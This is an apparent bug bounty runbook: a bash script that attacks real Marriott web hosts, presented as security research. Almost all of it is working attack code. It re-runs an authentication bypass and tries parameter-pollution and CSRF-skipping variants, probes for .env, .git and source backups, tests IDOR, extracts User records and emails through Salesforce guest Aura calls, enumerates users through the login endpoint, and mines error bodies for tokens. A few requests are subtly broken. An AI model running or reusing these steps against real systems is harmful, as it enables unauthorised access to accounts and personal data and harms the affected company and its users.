# Session 7 Runbook — Marriott Bug Bounty
# Goal: Reconfirm M018 + M002, chain-elevate both, probe psp/marrtool
# Date: 2026-06-22
# Pi path: ~/hunt/session7/

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/gorib/go/bin:/home/gorib/.pdtm/go/bin:/home/gorib/.local/bin

BB="${BB:-$HOME/bug-bounty-hunting-}"
OUTDIR="$BB/results/marriott/session7"
mkdir -p "$OUTDIR"
exec > >(tee "$OUTDIR/session7-output.txt") 2>&1

echo "=== SESSION 7 START: $(date) ==="

# ============================================================
# PHASE A — M018: RECONFIRM AUTH BYPASS (clean single command)
# Target: marriottfranchisetransactions.marriott.com/ajax.php
# Confirming: module=user&function=list bypasses auth without cookie
# ============================================================
echo ""
echo "===== PHASE A: M018 RECONFIRMATION ====="

# A0: Get fresh CSRF activekey (proves login page is live)
echo "--- A0: Get fresh activekey ---"
ACTIVEKEY=$(curl -sk 'https://marriottfranchisetransactions.marriott.com/login' \
  | grep -oP 'value="[a-f0-9]{40}"' | head -1 | grep -oP '[a-f0-9]{40}')
echo "activekey=$ACTIVEKEY"

# A1: RECONFIRM — auth bypass (no cookie, any activekey, expect 430B with Fatal Error)
echo "--- A1: Reconfirm auth bypass (no cookie) ---"
BYPASS_RESP=$(curl -sk \
  -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "module=user&function=list&activekey=${ACTIVEKEY}&data={}")
BYPASS_SIZE=${#BYPASS_RESP}
echo "Response size: ${BYPASS_SIZE}B"
echo "Response:"
echo "$BYPASS_RESP"
# EXPECT: ~430B with json_decode Fatal Error + /FranLic/www/html/ + MysqliDb
# If 93B → something changed (patched)

# A2: CONTRAST — confirm auth wall for protected function
echo "--- A2: Contrast (auth wall for applications_v2/list) ---"
AUTH_RESP=$(curl -sk \
  -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "module=applications_v2&function=list&activekey=${ACTIVEKEY}&data={}")
echo "Protected function size: ${#AUTH_RESP}B (expect 93B)"
echo "$AUTH_RESP"

# ============================================================
# PHASE B — M018: CHAIN ELEVATION ATTEMPTS
# ============================================================
echo ""
echo "===== PHASE B: M018 CHAIN ELEVATION ====="

# B1: GET-routing bypass — module/function in URL, JSON in body
# Theory: ajax.php may route via $_REQUEST (includes $_GET) while
# process_request reads php://input for JSON data.
# If TRUE: json_decode(php://input) → valid JSON → data returned WITHOUT auth
echo "--- B1: GET-routing bypass (module in URL + JSON body) ---"
B1_RESP=$(curl -sk \
  -X POST "https://marriottfranchisetransactions.marriott.com/ajax.php?module=user&function=list&activekey=${ACTIVEKEY}" \
  -H 'Content-Type: application/json' \
  -d '{"data":{"page":1,"per_page":10,"sort":"id","order":"asc"}}')
echo "B1 size: ${#B1_RESP}B"
echo "$B1_RESP"
# EXPECT: If >93B AND no Fatal Error → user data returned → HIGH FINDING

# B2: GET-routing bypass — module in URL, no data param (test if data is optional)
echo "--- B2: GET-routing, null data ---"
B2_RESP=$(curl -sk \
  -X POST "https://marriottfranchisetransactions.marriott.com/ajax.php?module=user&function=list" \
  -H 'Content-Type: application/json' \
  -d 'null')
echo "B2 size: ${#B2_RESP}B"
echo "$B2_RESP"

# B3: Multipart form data — sends data as string (not URL-encoded)
# With multipart, $_POST['data'] is definitely a string
# If code does json_decode($_POST['data']), multipart would succeed
echo "--- B3: Multipart form-data with JSON data field ---"
B3_RESP=$(curl -sk \
  -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
  -F "module=user" \
  -F "function=list" \
  -F "activekey=${ACTIVEKEY}" \
  -F 'data={"page":1,"per_page":10}')
echo "B3 size: ${#B3_RESP}B"
echo "$B3_RESP"
# EXPECT: If different from 430B → code path changed → analyze response

# B4: HTTP Parameter Pollution — send module twice (PHP takes last value)
# Tests if dispatcher sees module=auth (first, passes auth check)
# but router dispatches to user/list (last value wins)
echo "--- B4: HTTP Parameter Pollution (double module) ---"
B4_RESP=$(curl -sk \
  -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "module=auth&function=prelogin&activekey=${ACTIVEKEY}&module=user&function=list&data={}")
echo "B4 size: ${#B4_RESP}B"
echo "$B4_RESP"

# B5: CSRF bypass confirmation — no activekey at all
echo "--- B5: CSRF bypass (no activekey field) ---"
B5_RESP=$(curl -sk \
  -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'module=user&function=list&data={}')
echo "B5 (no activekey) size: ${#B5_RESP}B"
echo "$B5_RESP"
# EXPECT: ~430B (same as A1) = CSRF token never validated → addl finding

# B5b: Re-extract JS bundle and mine ALL module/function pairs exhaustively
# We got the bundle in session 5 but only spotted 3 module names.
# Full extraction = complete list of valid module/function pairs to test.
echo "--- B5b: Re-extract JS bundle for all module/function pairs ---"
JSGZ_URL=$(curl -sk 'https://marriottfranchisetransactions.marriott.com/' \
  | grep -oP 'src="[^"]*\.jgz[^"]*"' | head -3 | grep -oP '(?<=src=")[^"]+')
echo "JS bundle URL: $JSGZ_URL"
if [ -n "$JSGZ_URL" ]; then
  curl -sk "https://marriottfranchisetransactions.marriott.com${JSGZ_URL}" \
    -o /tmp/franlisc-bundle.jgz
  zcat /tmp/franlisc-bundle.jgz 2>/dev/null \
    | python3 -c "
import sys, re, json
js = sys.stdin.read()
print(f'JS size: {len(js)} bytes')

# Extract quoted strings near module/function keywords
modules = re.findall(r'module[\"\':\s]+([a-z_][a-z_0-9]{2,30})', js)
functions = re.findall(r'function[\"\':\s]+([a-z_][a-z_0-9]{2,30})', js)
# Extract ajax call patterns: {module: 'x', function: 'y'}
pairs = re.findall(r'module[\"\':\s]+[\"\']([\w]+)[\"\'].*?function[\"\':\s]+[\"\']([\w]+)[\"\']', js)
pairs += re.findall(r'function[\"\':\s]+[\"\']([\w]+)[\"\'].*?module[\"\':\s]+[\"\']([\w]+)[\"\']', js)

unique_modules = sorted(set(modules))
unique_functions = sorted(set(functions))
print(f'Distinct module-like strings: {len(unique_modules)}')
for m in unique_modules: print(f'  MODULE: {m}')
print(f'Distinct function-like strings: {len(unique_functions)}')
for f in unique_functions[:30]: print(f'  FUNC: {f}')
print(f'Paired matches: {len(pairs)}')
for p in pairs[:20]: print(f'  PAIR: {p}')
" 2>/dev/null
fi

# B6: Enumerate other user/* functions for additional bypasses
# Looking for any function that returns != 93B AND != 430B (would mean no json_decode bug)
echo "--- B6: user/* function enumeration ---"
for FUNC in get add edit delete save update search profile export download csv json all count index report view show create remove deactivate activate reset verify; do
  RESP=$(curl -sk \
    -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data "module=user&function=${FUNC}&activekey=${ACTIVEKEY}&data={}")
  SIZE=${#RESP}
  if [ "$SIZE" != "93" ]; then
    echo "ANOMALY user/${FUNC}: ${SIZE}B → $RESP"
  else
    echo "user/${FUNC}: ${SIZE}B (wall)"
  fi
done

# B7: Financial module enumeration
# "Marriott Owner and Franchise Services" — franchise financial portal
# These modules would have the highest-value data
echo "--- B7: Financial module enumeration ---"
for MODULE in transaction transactions payment payments report reports property properties franchise franchises owner owners financial invoice invoices revenue fee fees royalty contract contracts; do
  for FUNC in list get all export; do
    RESP=$(curl -sk \
      -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      --data "module=${MODULE}&function=${FUNC}&activekey=${ACTIVEKEY}&data={}")
    SIZE=${#RESP}
    if [ "$SIZE" != "93" ]; then
      echo "*** ANOMALY ${MODULE}/${FUNC}: ${SIZE}B"
      echo "$RESP" | head -5
    fi
  done
done

# B8: Source backup file discovery
# Path disclosure = /FranLic/www/html/ — now test for accessible PHP source
echo "--- B8: Source backup / debug file discovery ---"
for TESTPATH in \
  "ajax.php~" "ajax.php.bak" "ajax.php.old" "ajax.php.orig" \
  ".ajax.php" "ajax.php.swp" \
  "lib/internal/request.inc.php" "lib/request.inc.php" \
  "phpinfo.php" "info.php" "test.php" "debug.php" \
  ".env" "config.php" "config.inc.php" "database.php" \
  ".git/HEAD" ".git/config"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://marriottfranchisetransactions.marriott.com/${TESTPATH}")
  SIZE=$(curl -sk -o /dev/null -w "%{size_download}" \
    "https://marriottfranchisetransactions.marriott.com/${TESTPATH}")
  if [ "$CODE" != "200" ] || [ "$SIZE" -lt 100 ] 2>/dev/null; then
    echo "${TESTPATH} → $CODE / ${SIZE}B"
  else
    echo "*** HIT: ${TESTPATH} → $CODE / ${SIZE}B"
    curl -sk "https://marriottfranchisetransactions.marriott.com/${TESTPATH}" | head -20
  fi
done

# B9: Directory listing test
echo "--- B9: Directory listing ---"
for DIR in lib/ lib/internal/ assets/ includes/ config/ upload/ uploads/ img/ css/ js/ src/ vendor/; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://marriottfranchisetransactions.marriott.com/${DIR}")
  SIZE=$(curl -sk -o /dev/null -w "%{size_download}" \
    "https://marriottfranchisetransactions.marriott.com/${DIR}")
  echo "${DIR} → $CODE / ${SIZE}B"
done

# B10: IDOR via user/get with numeric IDs
# If user/get bypasses auth (returns !=93B), test with IDs
echo "--- B10: user/get with IDs (test for IDOR) ---"
for ID in 1 2 3 100 1000; do
  RESP=$(curl -sk \
    -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data "module=user&function=get&activekey=${ACTIVEKEY}&data={\"id\":$ID}")
  SIZE=${#RESP}
  echo "user/get id=$ID: ${SIZE}B"
  [ "$SIZE" != "93" ] && echo "  HIT: $RESP"
done

# ============================================================
# PHASE C — M002: RECONFIRM SALESFORCE GUEST USER EXPOSURE
# Target: cpp.marriott.com/s/sfsites/aura
# ============================================================
echo ""
echo "===== PHASE C: M002 RECONFIRMATION ====="

# Helper function for Aura calls
aura_call() {
  local descriptor="$1"
  local params="$2"
  curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b /tmp/cpp-s7-session.txt \
    --data-urlencode "message={\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"${descriptor}\",\"callingDescriptor\":\"UNKNOWN\",\"params\":${params}}]}" \
    --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
    --data-urlencode 'aura.pageURI=/s/' \
    --data-urlencode 'aura.token=undefined'
}

# Get and store guest session cookie
echo "--- C0: Capture guest session cookie ---"
curl -skc /tmp/cpp-s7-session.txt "https://cpp.marriott.com/s/" -o /dev/null
echo "Cookie file:"
cat /tmp/cpp-s7-session.txt 2>/dev/null | grep -v '^#' | grep -v '^$'

# C1: RECONFIRM getObjectInfo User → state:SUCCESS with field count
echo "--- C1: Reconfirm getObjectInfo(User) ---"
aura_call \
  "aura://RecordUiController/ACTION\$getObjectInfo" \
  '{"objectApiName":"User"}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions', []):
        state = a.get('state','?')
        rv = a.get('returnValue', {}) or {}
        fields = rv.get('fields', {})
        print(f'state={state} | field_count={len(fields)}')
        sensitive = ['Email','FirstName','LastName','Address','City','Phone',
                     'MobilePhone','CompanyName','CommunityNickname','HasUserVerifiedEmail',
                     'AccountId','ContactId','UserType']
        for f in sensitive:
            if f in fields:
                fd = fields[f]
                print(f'  CONFIRMED: {f} | label={fd.get(\"label\")} | type={fd.get(\"dataType\")}')
except Exception as e:
    print('parse error:', e)
    print(raw[:300])
"
# EXPECT: state=SUCCESS | field_count=203

# C2: Contrast — Contact blocked (proves User is misconfigured specifically)
echo "--- C2: Contrast getObjectInfo(Contact) ---"
aura_call \
  "aura://RecordUiController/ACTION\$getObjectInfo" \
  '{"objectApiName":"Contact"}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions',[]):
        print('Contact state:', a.get('state','?'))
except: print(raw[:200])
"
# EXPECT: state=ERROR (contrast proves User guest access is specific misconfiguration)

# ============================================================
# PHASE D — M002: CHAIN ELEVATION — RECORD ACCESS ATTEMPTS
# Goal: Get actual User records (IDs, emails) = High (8.6) finding
# ============================================================
echo ""
echo "===== PHASE D: M002 CHAIN ELEVATION — RECORD ACCESS ====="

# D1: searchRecords — global search across User objects
# Often works even when getItems fails; returns matching records
echo "--- D1: searchRecords(User, q=a) ---"
aura_call \
  "aura://RecordUiController/ACTION\$searchRecords" \
  '{"q":"a","objectApiName":"User","fields":["User.Id","User.Name","User.Email","User.FirstName"],"optionalFields":[],"pageSize":5}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue')
        err = a.get('error')
        print(f'state={state}')
        if rv:
            if isinstance(rv, list):
                print(f'records_count={len(rv)}')
                for r in rv[:3]: print(' ', json.dumps(r, indent=2)[:300])
            elif isinstance(rv, dict):
                print('returnValue keys:', list(rv.keys()))
        if err:
            print('error:', str(err)[:300])
except Exception as e:
    print('parse error:', e)
    print(raw[:500])
"
# CRITICAL: state=SUCCESS + records with Email = HIGH FINDING

# D2: getListUi — retrieve list view records
# Different API from getItems; may have different access controls
echo "--- D2: getListUi(User, AllUsers) ---"
aura_call \
  "aura://RecordUiController/ACTION\$getListUi" \
  '{"objectApiName":"User","listViewApiName":"AllUsers","pageSize":5,"pageToken":null,"fields":["User.Id","User.Email","User.Name"],"optionalFields":[],"sortBy":null,"updateMru":false}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue') or {}
        print(f'state={state}')
        if isinstance(rv, dict):
            recs = rv.get('records', {})
            if isinstance(recs, dict):
                items = recs.get('records', [])
                print(f'records_in_page={len(items)}')
                for r in items[:3]: print(' ', json.dumps(r)[:300])
        err = a.get('error')
        if err: print('error:', str(err)[:300])
except Exception as e:
    print('parse error:', e)
    print(raw[:500])
"

# D3: getItems with explicit list view name (our prior test had wrong descriptor name)
echo "--- D3: getItems(User) with AllUsers listViewApiName ---"
aura_call \
  "aura://RecordUiController/ACTION\$getItems" \
  '{"objectApiName":"User","listViewApiName":"AllUsers","pageSize":5,"currentPage":0,"fields":["User.Id","User.Email","User.Name","User.FirstName"]}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue')
        err = a.get('error')
        print(f'state={state}')
        if rv: print('returnValue:', json.dumps(rv)[:500])
        if err: print('error:', str(err)[:300])
except Exception as e:
    print('parse error:', e)
    print(raw[:500])
"

# D4: getRecord with fabricated User IDs
# Salesforce User IDs start with 005 (15 or 18 chars)
# Try a few common patterns
echo "--- D4: getRecord with User IDs ---"
for SFID in "0050000000000001AAA" "0050000000000002AAA" "005000000000001AAA" "0050000000001"; do
  RESP=$(aura_call \
    "aura://RecordUiController/ACTION\$getRecord" \
    "{\"recordId\":\"${SFID}\",\"fields\":[\"User.Id\",\"User.Email\",\"User.Name\"]}")
  STATE=$(echo "$RESP" | python3 -c "import sys,json; d=sys.stdin.read(); obj=json.loads(d[d.index('{'):]); [print(a.get('state','?')) for a in obj.get('actions',[])]" 2>/dev/null)
  SIZE=${#RESP}
  echo "getRecord(${SFID}): state=${STATE} | ${SIZE}B"
done

# D5: getCurrentUserOrGuest — get guest user info
# Often reveals guest user ID, which can be used to pivot
echo "--- D5: getCurrentUserOrGuest ---"
aura_call \
  "aura://UserController/ACTION\$getCurrentUserOrGuest" \
  '{}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue')
        print(f'state={state}')
        if rv: print('returnValue:', json.dumps(rv, indent=2)[:500])
except Exception as e:
    print('parse error:', e)
    print(raw[:500])
"
# May return: {"id":"005XXXXX","name":"Guest User","isGuest":true}
# If returns actual user ID format → confirms guest profile object

# D6: CommLoginController — user enumeration via login
# Valid email → different error body/size vs non-existent email = user enumeration
# Note: try both apex:// and serviceComponent:// descriptor prefixes
echo "--- D6: CommLoginController user enumeration ---"
FAKE_EMAIL="definitely_nonexistent_test_user_xyz999@invalid-fakehost-abcdef123.com"
REAL_FORMAT_EMAIL="admin@marriott.com"

for EMAIL in "$FAKE_EMAIL" "$REAL_FORMAT_EMAIL" "noreply@marriott.com"; do
  # Try apex:// descriptor (standard Apex Aura controller prefix)
  RESP=$(curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "message={\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"apex://CommLoginController/ACTION\$login\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"username\":\"${EMAIL}\",\"password\":\"INVALID_PASSWORD_Test_xyz999\",\"startUrl\":\"\"}}]}" \
    --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
    --data-urlencode 'aura.pageURI=/s/' \
    --data-urlencode 'aura.token=undefined')
  SIZE=${#RESP}
  STATE=$(echo "$RESP" | python3 -c "
import sys,json
d=sys.stdin.read()
try:
    obj=json.loads(d[d.index('{'):])
    for a in obj.get('actions',[]):
        err=a.get('error',[])
        msg=err[0].get('message','') if err else ''
        print(a.get('state','?'), '|', msg[:120])
except: print(d[:100])
" 2>/dev/null)
  echo "${EMAIL}: ${SIZE}B | ${STATE}"
done
# SIZE or message difference between fake vs real-format email → user enumeration confirmed

# D7: Parse the large ERROR body from Contact getObjectInfo
# 4.3MB error bodies may contain: session tokens, component configs, user IDs
echo "--- D7: Parse Contact ERROR body for embedded tokens/IDs ---"
aura_call \
  "aura://RecordUiController/ACTION\$getObjectInfo" \
  '{"objectApiName":"Contact"}' \
  | python3 -c "
import sys, json, re
raw = sys.stdin.read()
print(f'Total size: {len(raw)}B')
# Look for Session IDs (Salesforce format: alphanumeric 64+ chars)
session_patterns = re.findall(r'[a-zA-Z0-9!]{64,}', raw)
if session_patterns:
    print(f'Potential tokens ({len(session_patterns)} found):')
    for t in session_patterns[:5]: print(f'  {t[:80]}...')
# Look for User IDs (005 prefix)
user_ids = re.findall(r'005[a-zA-Z0-9]{12,15}', raw)
if user_ids:
    print(f'User IDs found: {user_ids[:5]}')
# Look for email addresses
emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', raw)
if emails:
    print(f'Emails in error body: {emails[:10]}')
# Look for hostnames
hosts = re.findall(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}[^\s\"\']*', raw)
if hosts:
    print(f'URLs in body: {hosts[:10]}')
print('First 300B of error body:')
print(raw[:300])
"

# D8: Apex REST endpoint discovery
echo "--- D8: Apex REST endpoint discovery ---"
for EP in "" "ping" "User" "Community" "Search" "Members" "v1" "api"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -b /tmp/cpp-s7-session.txt \
    "https://cpp.marriott.com/services/apexrest/${EP}")
  SIZE=$(curl -sk -o /dev/null -w "%{size_download}" \
    -b /tmp/cpp-s7-session.txt \
    "https://cpp.marriott.com/services/apexrest/${EP}")
  echo "apexrest/${EP}: $CODE / ${SIZE}B"
done

# D3b: getItems via serviceComponent descriptor (different access path from RecordUiController)
# The "internal server error" vs "access denied" means the action REACHED server code
# Different descriptor = different permission evaluation path in Salesforce framework
echo "--- D3b: getItems via serviceComponent descriptor ---"
aura_call \
  "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"User","layoutType":"COMPACT","pageSize":25,"currentPage":0,"listViewApiName":"AllUsers"}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue')
        err = a.get('error')
        print(f'state={state} | type={type(rv).__name__}')
        if rv:
            if isinstance(rv, list):
                print(f'RECORD COUNT: {len(rv)}')
                for r in rv[:3]: print(' ', json.dumps(r)[:300])
            elif isinstance(rv, dict):
                items = rv.get('items', rv.get('records', []))
                print(f'RECORD COUNT: {len(items)}')
                for r in items[:3]: print(' ', json.dumps(r)[:300])
        if err: print('error:', str(err)[:300])
except Exception as e:
    print('parse error:', e, raw[:300])
"
# CRITICAL: state=SUCCESS + records = HIGH/CRITICAL FINDING

# D9: Mine 4.3MB error body for real fwuid + embedded User IDs
# INSIGHT: 4.3MB error bodies = Aura bootstrap context dump
# Real fwuid enables valid Aura context → unlocks actions blocked by framework mismatch
echo "--- D9: Mine Contact ERROR body for fwuid + User IDs ---"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"Contact"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  -o /tmp/cpp-big-error.json
python3 << 'PYEOF'
import re, json
d = open('/tmp/cpp-big-error.json').read()
print(f"Error body size: {len(d)} bytes")

# Extract fwuid (framework UID) — critical for valid Aura context
fwuids = re.findall(r'"fwuid"\s*:\s*"([^"]+)"', d)
if fwuids:
    print(f"REAL FWUID FOUND: {fwuids[0]}")
    open('/tmp/cpp-real-fwuid.txt','w').write(fwuids[0])
else:
    print("No fwuid in error body")

# Extract User IDs (005 prefix, 15/18 char Salesforce IDs)
user_ids = list(set(re.findall(r'\b005[A-Za-z0-9]{12,15}\b', d)))
print(f"User IDs embedded: {len(user_ids)}")
for u in user_ids[:5]: print(f"  {u}")
if user_ids:
    open('/tmp/cpp-user-ids.txt','w').write('\n'.join(user_ids))

# Extract emails (Marriott-domain)
emails = list(set(re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9.-]+', d)))
marriott_emails = [e for e in emails if 'marriott' in e.lower()]
print(f"Marriott emails in body: {len(marriott_emails)}")
for e in marriott_emails[:5]: print(f"  {e}")

# App name / community name (for targeted descriptor lookup)
app_names = re.findall(r'"appName"\s*:\s*"([^"]+)"', d)
if app_names: print(f"App name: {app_names[0]}")

# Community site descriptors (custom Apex controllers)
apex_ctrlrs = re.findall(r'apex://[A-Za-z0-9_]+/ACTION\$[a-zA-Z]+', d)
if apex_ctrlrs:
    print(f"Custom Apex controllers in bootstrap:")
    for c in list(set(apex_ctrlrs))[:10]: print(f"  {c}")
PYEOF

# D9b: If real fwuid was extracted, re-run getItems with valid context
echo "--- D9b: Re-run getItems with real fwuid (if found) ---"
REAL_FWUID=$(cat /tmp/cpp-real-fwuid.txt 2>/dev/null || echo "NOT_FOUND")
echo "Using fwuid: $REAL_FWUID"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"User","layoutType":"COMPACT","pageSize":25,"currentPage":0}}]}' \
  --data-urlencode "{\"mode\":\"PROD\",\"fwuid\":\"${REAL_FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue')
        err = a.get('error')
        print(f'state={state} (with real fwuid)')
        if rv:
            items = rv if isinstance(rv, list) else rv.get('items', rv.get('records', []))
            if isinstance(items, list) and items:
                print(f'*** RECORDS RETURNED: {len(items)} ***')
                for r in items[:3]: print(json.dumps(r)[:400])
        if err: print('error:', str(err)[:300])
except Exception as e:
    print('parse error:', e, raw[:300])
"

# D10: LWC endpoint (newer Salesforce communities use /sfsites/lwr/)
echo "--- D10: LWC endpoint probe ---"
curl -sk -o /dev/null -w "LWC /lwr/ : %{http_code} / %{size_download}B\n" \
  "https://cpp.marriott.com/s/sfsites/lwr/"
curl -sk -o /dev/null -w "LWC /lwr/fetch: %{http_code} / %{size_download}B\n" \
  "https://cpp.marriott.com/s/sfsites/lwr/fetch"

# D10: REST SOQL query as guest
echo "--- D10: REST SOQL as guest (with session cookie) ---"
curl -sk \
  -H "Accept: application/json" \
  -b /tmp/cpp-s7-session.txt \
  "https://cpp.marriott.com/services/data/v55.0/query?q=SELECT+Id,Email,Name,FirstName+FROM+User+LIMIT+3" \
  | python3 -c "
import sys, json
d = sys.stdin.read()
print(f'size={len(d)}B')
try:
    obj = json.loads(d)
    print(json.dumps(obj, indent=2)[:800])
except:
    print(d[:300])
"

# D11: Community page JS — extract custom Aura component descriptors
echo "--- D11: Extract custom Aura component descriptors from community JS ---"
# Fetch community page and extract JS bundle URLs
COMMUNITY_HTML=$(curl -sk "https://cpp.marriott.com/s/")
echo "Community page size: ${#COMMUNITY_HTML}B"
# Extract script sources
echo "$COMMUNITY_HTML" | python3 -c "
import sys, re
html = sys.stdin.read()
scripts = re.findall(r'src=[\"\'](https?://[^\"\']+\.js[^\"\']*)[\"\'|]', html)
print(f'JS files found: {len(scripts)}')
for s in scripts: print(' ', s[:120])
# Also look for inline Aura config
aura_config = re.findall(r'\\\$A\.initConfig\([^)]{1,500}\)', html)
if aura_config: print('Aura initConfig:', aura_config[0][:300])
# Look for component descriptors
descriptors = re.findall(r'[a-z]+://[a-zA-Z.]+/ACTION\\\$[a-zA-Z]+', html)
if descriptors: print('Descriptors in HTML:', descriptors[:10])
"

# ============================================================
# PHASE E — NEW TARGETS: marrtool.com + psp.marriott.com
# 0 prior reports each — fresh attack surface
# ============================================================
echo ""
echo "===== PHASE E: NEW TARGETS ====="

# E1: marrtool.com — unknown asset (1 prior report on scope list)
echo "--- E1: marrtool.com fingerprint ---"
curl -sk -D - "https://marrtool.com/" | head -30
echo "---"
curl -sk -o /dev/null -w "Root: %{http_code} / %{size_download}B / type=%{content_type}\n" "https://marrtool.com/"
for PATH_E1 in login admin api v1 v2 health status swagger swagger-ui.html openapi.json .git/HEAD actuator actuator/health robots.txt sitemap.xml; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://marrtool.com/${PATH_E1}")
  SIZE=$(curl -sk -o /dev/null -w "%{size_download}" "https://marrtool.com/${PATH_E1}")
  echo "marrtool/${PATH_E1}: $CODE / ${SIZE}B"
done

# E2: marrtool.com — tech fingerprint from headers
echo "--- E2: marrtool.com headers ---"
curl -skI "https://marrtool.com/" | grep -iE "server|x-powered|x-frame|content-type|location|cf-ray|via|x-amz|x-azure"

# E3: psp.marriott.com — payment service probe
echo "--- E3: psp.marriott.com payment endpoint enum ---"
curl -sk -o /dev/null -w "Root: %{http_code} / %{size_download}B\n" "https://psp.marriott.com/"
for PATH_E3 in \
  api api/v1 api/v2 api/v3 \
  payments payments/list transactions \
  webhooks webhook \
  health status ping \
  swagger swagger-ui.html openapi.json v2/api-docs v3/api-docs api-docs \
  actuator actuator/health actuator/env actuator/mappings \
  .well-known/openid-configuration \
  oauth token authorize; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://psp.marriott.com/${PATH_E3}")
  SIZE=$(curl -sk -o /dev/null -w "%{size_download}" "https://psp.marriott.com/${PATH_E3}")
  if [ "$CODE" != "404" ] && [ "$CODE" != "000" ]; then
    echo "psp/${PATH_E3}: $CODE / ${SIZE}B"
  fi
done

# E4: psp.marriott.com — headers + tech fingerprint
echo "--- E4: psp.marriott.com headers ---"
curl -skI "https://psp.marriott.com/" | grep -iE "server|x-powered|content-type|via|x-amz|location|x-frame"

echo ""
echo "=== SESSION 7 COMPLETE: $(date) ==="
echo "=== Output saved to $OUTDIR/session7-output.txt ==="
